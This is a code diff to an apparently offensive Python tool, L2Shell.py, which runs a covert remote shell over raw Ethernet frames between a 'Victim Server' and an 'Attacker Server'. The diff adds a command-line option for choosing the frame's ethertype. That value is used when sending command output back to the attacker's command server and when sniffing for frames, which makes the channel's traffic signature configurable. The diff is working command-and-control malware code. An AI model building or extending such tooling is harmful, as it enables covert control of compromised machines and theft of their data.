@@ -24,6 +24,7 @@ frame_delay = 0.5      # For chunked responses, could help by spacing out frames
 session_id  = "default" # Id for accessing the session
 attacker_id = "default" # Id for returning information to the attacker server
 relay_broadcast = False # Relay broadcast from attacker to all
+ethertype = 0x9000 # Relay broadcast from attacker to all
 
 sid_forward = ["laptop5566"] # Used by bridge beacons
 
@@ -75,6 +76,9 @@ c2_id_r = c2_id_r.hexdigest()
 def send_frame(message, mac_address, sender):
     global interfaces
     global os_name
+    global ethertype
+    # Temporary ethernet frame type change
+    #ethertype = 0x8892
     
     if relay_broadcast == False:
         # Next send the output back to the command server
@@ -82,7 +86,7 @@ def send_frame(message, mac_address, sender):
         for frame in frames:
             time.sleep(frame_delay)
             frame = sender + frame.decode('utf-8') # Make sure to add the attacker id
-            eth_frame = Ether(dst=mac_address) / frame
+            eth_frame = Ether(dst=mac_address, type=ethertype) / frame
             
             # Send the Ethernet frame
             with open(os.devnull, 'w') as f:
@@ -420,7 +424,7 @@ def proxy(mode):
     proxy_thread = threading.Thread(target=start_udpproxy)
     proxy_thread.start()
     
-    start_sniffing_args(attacker_id, session_id, mode, main_interface)
+    start_sniffing_args(attacker_id, session_id, mode, main_interface, ethertype)
     #proxy_thread2.start()
     
     #time.sleep(10) #wait 10 seconds
@@ -477,6 +481,7 @@ def main():
     global frame_size
     global frame_delay
     global main_interface
+    global ethertype
     epilog="""
     e.g. python3 L2Shell.py -l -a 1a1a1a -s 3f3f3f <-- Victim Server
     e.g. python3 L2Shell.py -c -a 1a1a1a -s 3f3f3f <-- Attacker Server       
@@ -497,12 +502,17 @@ def main():
     parser.add_argument("-p", "--proxy", action='store_true', help="Proxy - UDP ports 1111, 2222")
     parser.add_argument("-i", "--interface", help="Interface", type=str)
     parser.add_argument("-si", "--setup-interface", help="Interface", action='store_true')
+    parser.add_argument("-et", "--ethertype", help="Ethertype 0x0000-0xFFFF", type=str)
     
     
     args = parser.parse_args()
     
     if args.mac:
         mac_address = args.mac
+        
+    if args.ethertype:
+        ethertype = int(args.ethertype, 16)
+        #ethertype = args.ethertype
         
     if args.interface:
         main_interface = "\\Device\\NPF_" + args.interface
